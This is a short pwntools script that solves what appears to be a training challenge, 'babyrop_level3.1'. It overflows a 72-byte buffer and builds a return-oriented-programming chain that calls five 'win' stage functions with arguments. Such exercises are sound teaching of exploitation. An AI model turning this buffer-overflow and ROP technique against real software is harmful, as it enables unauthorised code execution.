#!/usr/bin/python3
from pwn import *

'''
-- OBIETTIVO DEL PROGRAMMA --

-----------------------------
'''

context.log_level = 'CRITICAL'
context.arch = 'amd64'

elf = ELF('/challenge/babyrop_level3.1')
p = elf.process()

rop = ROP(elf)
gadget_addr = rop.rdi.address

delta_len = 72
bytestream = b'A' * delta_len  + p64(gadget_addr) + p64(1) + p64(elf.symbols['win_stage_1']) + \
             p64(gadget_addr) + p64(2) + p64(elf.symbols['win_stage_2']) + \
             p64(gadget_addr) + p64(3) + p64(elf.symbols['win_stage_3']) + \
             p64(gadget_addr) + p64(4) + p64(elf.symbols['win_stage_4']) + \
             p64(gadget_addr) + p64(5) + p64(elf.symbols['win_stage_5'])

p.sendline(bytestream)
p.interactive()
